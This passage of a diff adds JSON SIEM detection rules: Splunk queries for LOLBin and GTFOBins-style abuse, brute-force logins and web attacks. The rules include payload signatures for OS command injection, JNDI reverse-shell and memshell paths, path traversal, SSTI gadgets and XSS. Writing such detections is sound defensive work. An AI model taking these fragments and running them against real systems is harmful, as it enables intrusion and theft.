+        "name": "(Windows) T1564.004: Findstr.exe",
+        "query": "(index=\"windows\") AND (findstr)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Makecab.exe",
+        "query": "(index=\"windows\") AND (makecab)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Mavinject.exe",
+        "query": "(index=\"windows\") AND (Mavinject.exe 4172)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Print.exe",
+        "query": "(index=\"windows\") AND (print /D:*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: PrintBrm.exe",
+        "query": "(index=\"windows\") AND (PrintBrm -r -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Reg.exe",
+        "query": "(index=\"windows\") AND (reg export)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Regedit.exe",
+        "query": "(index=\"windows\") AND (regedit)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Regini.exe",
+        "query": "(index=\"windows\") AND (regini.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Rundll32.exe",
+        "query": "(index=\"windows\") AND (rundll32 *,DllMain)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Sc.exe",
+        "query": "(index=\"windows\") AND (sc create)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1564.004: Sc.exe-1",
+        "query": "sc config",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Tar.exe",
+        "query": "(index=\"windows\") AND (tar -cf)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1564.004: Tar.exe-1",
+        "query": "tar -xf",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Wmic.exe",
+        "query": "(index=\"windows\") AND (wmic.exe process call create)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Wscript.exe",
+        "query": "(index=\"windows\") AND (wscript)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1564.004: Wscript.exe-1",
+        "query": "echo GetObject(*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564: DeviceCredentialDeployment.exe",
+        "query": "(index=\"windows\") AND (DeviceCredentialDeployment)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1567: ConfigSecurityPolicy.exe",
+        "query": "(index=\"windows\") AND (ConfigSecurityPolicy.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1567: DataSvcUtil.exe",
+        "query": "(index=\"windows\") AND (DataSvcUtil)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tac",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tac -s RANDOM)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tail",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tail -c1G)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) task",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (task execute)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) taskset",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (taskset 1 /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tasksh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tasksh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tbl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tbl)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tclsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tclsh*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tcpdump",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (echo > chmod +x tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z)",
+        "sevirity": 4
+    },
+    {
+        "name": "Tcpsump or/and netstat",
+        "query": "(\"tcpdump\" OR \"netstat\" OR \"arp\")",
+        "sevirity": 1
+    },
+    {
+        "name": "(Linux) tdbtool",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tdbtool* /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tee",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (echo DATA tee -a)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) telnet",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (telnet */bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) terraform",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (terraform consolefile*)",
+        "sevirity": 4
+    },
+    {
+        "name": "Test Alert",
+        "query": "SomethingForTest\"HelloWorld!\"!@#",
+        "sevirity": 3
+    },
+    {
+        "name": "Test Alert-1",
+        "query": "SomethingForTest\"HelloWorld!\"!@#",
+        "sevirity": 3
+    },
+    {
+        "name": "Test Alert-2",
+        "query": "SomethingForTest\"HelloWorld!\"!@#",
+        "sevirity": 3
+    },
+    {
+        "name": "Test Alert-3",
+        "query": "SomethingForTest\"HelloWorld!\"!@#",
+        "sevirity": 3
+    },
+    {
+        "name": "Test Alert-4",
+        "query": "SOMthinForTestHERHER",
+        "sevirity": 4
+    },
+    {
+        "name": "Test Alert-5",
+        "query": "SOMthinForTestHERHER",
+        "sevirity": 3
+    },
+    {
+        "name": "test python",
+        "query": "host=\"vkc-sec-nam\" a0=python3 a2=\"http.server\"",
+        "sevirity": 5
+    },
+    {
+        "name": "(Linux) tex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tex --shell-escape)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) texec",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (echo -e 'pipe\\tx\\texec * 1>&0 2>&0')",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tftp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*tftp *get)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tic",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tic -C)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) time",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (\"time /bin/*\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) timedatectl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (timedatectl */bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) timeout",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (timeout /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tmate",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tmate -c /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) tmux",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (tmux)",
+        "sevirity": 4
+    },
+    {
+        "name": "Top 10 Failed Logins",
+        "query": "source=prod OktaClass=PasswordBasedLoginController AND \"LoginStatus: INVALID_CREDENTIALS\" NOT \"mycompany\" NOT \"primeapp\" NOT \"rumblies\" NOT \"rod-ops-mon@servicesource.com\" NOT \"stkwebalerts\" | reltime | rex field=_raw \"User: \\[(?<username>.*)\\] attempted login on domain \\[(?<domain>.*)\\] from \\[(?<sip>.*)\\] with result: \\[User:(?<uid>.*) LoginStatus: (?<status>.*)\\]. \\[\"\n| where domain=$Organization$\n| convert ctime(_time) as timer\n| stats count(status) as counter by sip\n| sort counter\n| top counter, sip",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) torify",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (torify)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) torsocks",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (torsocks /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) troff",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (troff)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ul",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ul)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) unexpand",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (unexpand -t*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) unshare",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (\"unshare /bin/*\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) unsquashfs",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (unsquashfs shell)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) unzip",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (unzip -K -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) update-alternatives",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (update-alternatives)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) uudecode",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (uuencode)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) uuencode",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (uuencode /dev/stdout)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) vagrant",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (vagrant)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) valgrind",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (valgrind)",
+        "sevirity": 4
+    },
+    {
+        "name": "Validate App Deployment",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/validate | eval Step=substr(step, 6) | sort Step | rename result.Status TO Status | rename result.information TO Information | eval Name='result.Verification step' | eval Suggestion='result.Suggested action' | eval Information='result.Information'  | table Step, Name, Status, Information, Suggestion",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) varnishncsa",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (varnishncsa -g -q)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) vi",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (vi /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) view",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"view\" OR comm=\"*/view\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) vigr",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (vigr)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) vim",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (vim)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) vimdiff",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (vimdiff)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) vipw",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (vipw)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) virsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (virsh qemu)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) volatility",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"volatility *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) w3m",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (w3m -dump)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) wall",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo wall --nobanner)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) watch",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (watch exec sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) wc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (wc --files0-from)",
+        "sevirity": 4
+    },
+    {
+        "name": "WebAttack",
+        "query": "\"*cmd=read*\" OR \"*connect&target*\" OR \"*cmd=connect*\" OR \"*cmd=disconnect*\" OR \"*cmd=forward*\"",
+        "sevirity": 3
+    },
+    {
+        "name": "WebAttack_Java_Payload",
+        "query": "\"%24%7B%28%23a%3D%40\" OR \"${(#a=@\" OR \"%24%7B%40java\" OR \"${@java\" OR \"u0022java\" OR \"%2F%24%7B%23\" OR \"/${#\" OR \"new+java.\" OR \"getRuntime().exec(\" OR \"getRuntime%28%29.exec%28\" OR \"ls\"",
+        "sevirity": 3
+    },
+    {
+        "name": "WebAttack_JNDI_Exploit",
+        "query": "\"/Basic/Command/Base64/\" OR \"/Basic/ReverseShell/\" OR \"/Basic/TomcatMemshell\" OR \"/Basic/JettyMemshell\" OR \"/Basic/WeblogicMemshell\" OR \"/Basic/JBossMemshell\" OR \"/Basic/WebsphereMemshell\" OR \"/Basic/SpringMemshell\" OR \"/Deserialization/URLDNS/\" OR \"/Deserialization/CommonsCollections1/Dnslog/\" OR \"/Deserialization/CommonsCollections2/Command/Base64/\" OR \"/Deserialization/CommonsBeanutils1/ReverseShell/\" OR \"/Deserialization/Jre8u20/TomcatMemshell\" OR \"/TomcatBypass/Dnslog/\" OR \"/TomcatBypass/Command/\" OR \"/TomcatBypass/ReverseShell/\" OR \"/TomcatBypass/TomcatMemshell\" OR \"/TomcatBypass/SpringMemshell\" OR \"/GroovyBypass/Command/\" OR \"/WebsphereBypass/Upload/\"",
+        "sevirity": 3
+    },
+    {
+        "name": "WebAttack_OS_Injection",
+        "query": "\"*=whoami\" OR \"*=net%20user\" OR \"*=net+user\" OR \"*=cmd%20/c%\" OR \"*=cmd+/c+\" OR \"*=cmd%2B/c%\" OR \"*=cmd%20/r%\" OR \"*=cmd+/r+\" OR \"*=cmd%2B/r%\" OR \"*=cmd%20/k%\" OR \"*=cmd+/k+\" OR \"*=cmd%2B/k%\" OR \"*=powershell%*\" OR \"*=powershell+*\" OR \"*=tasklist%*\" OR \"*=tasklist+*\" OR \"*=wmic%*\" OR \"*=wmic+*\" OR \"*=ssh%*\" OR \"*=ssh+*\" OR \"*=python%*\" OR \"*=python+*\" OR \"*=python3%*\" OR \"*=python3+*\" OR \"*=ipconfig\" OR \"*=wget%*\" OR \"*=wget+*\" OR \"*=curl%*\" OR \"*=curl+*\" OR \"*=certutil*\" OR \"*=copy%20%5C%5C*\" OR \"*=dsquery%*\" OR \"*=dsquery+*\" OR \"*=nltest%*\" OR \"*=nltest+*\"",
+        "sevirity": 4
+    },
+    {
+        "name": "WebAttack_Path_Traversal",
+        "query": "\"*../../../../../lib/password*\" OR \"*../../../../windows/*\" OR \"*../../../etc/*\" OR \"/Basic/JettyMemshell\" OR \"*..%252f..%252f..%252fetc%252f*\" OR \"*..%c0%af..%c0%af..%c0%afetc%c0%af*\" OR \"*%252e%252e%252fetc%252f*\"",
+        "sevirity": 3
+    },
+    {
+        "name": "WebAttack_SSTI",
+        "query": "\"={{\" OR \"=%7B%7B\" OR \"=${\" OR \"=$%7B\" OR \"=<%=\" OR \"=%3C%25=\" OR \"=@(\" OR \"freemarker.template.utility.Execute\" OR \"*.getClass().forName('javax.script.ScriptEngineManager\" OR \"T(org.apache.commons.io.IOUtils)\"",
+        "sevirity": 3
+    },
+    {
+        "name": "WebAttack_XSS",
+        "query": "\"*=<script>*\" OR \"*=%3Cscript%3E*\" OR \"*=%253Cscript%253E*\" OR \"*<iframe *\" OR \"*%3Ciframe *\" OR \"*<svg *\" OR \"*%3Csvg *\" OR \"*document.cookie*\" OR \"*document.domain*\" OR \"* onerror=*\" OR \"* onresize=*\" OR \"* onload=*\" OR \"onmouseover=*\" OR \"${alert*\" OR \"javascript:alert*\" OR \"javascript%3Aalert*\"",
+        "sevirity": 2
+    },
+    {
+        "name": "WebAttacke_DotGit_Exploatation",
+        "query": "\"*.git/*\" OR \"*.git/\" OR \"*.git\"",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) whiptail",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*whiptail --textbox --scrolltext)",
+        "sevirity": 4
+    },
+    {
+        "name": "whoami",
+        "query": "whoami",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) whois",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (whois -h -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "Windows BruteForce Successful",
+        "query": "index=* (EventCode=4624 OR EventCode=4625) \n| bin _time span=5m as minute \n| stats list(Keywords) as Attempts, count(eval(EventCode=4625)) as Failed,\n     count(eval(EventCode=4624)) as Success, list(Failure_Reason) as \"Failure Reason\", list(host) as \"Machine Identifier\" by minute Account_Name \n| where mvcount(Attempts)>=10 AND Success>=1 AND Failed>=9 \n| eval minute=strftime(minute,\"%H:%M\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) wish",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (wishexec /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xargs",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xargs -a)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xdg-user-dir",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xdg-user-dir '}; * #')",
+        "sevirity": 4
+    },
+    {
+        "name": "xdg-user-dir-1",
+        "query": "xdg-user-dir '}; * #'",
+        "sevirity": 4
+    },
+    {
+        "name": "xdg-user-dir-2",
+        "query": "xdg-user-dir '}; * #'",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xdotool",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xdotool exec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xelatex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xelatex)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xetex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xetex --shell-escape)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xmodmap",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xmodmap -v)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xmore",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*xmore)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xpad",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xpad -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) xz",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (xz -d)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) yarn",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (yarn exec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) yash",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (yash)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) yelp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (yelp man)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) yum",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (yum install http*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) zathura",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (zathura /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) zip",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=zip)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) zsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm\"*zsh*\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) zsoelim",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (zsoelim)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) zypper",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (zypper x\n*\ncp)",
+        "sevirity": 4
+    }
+]
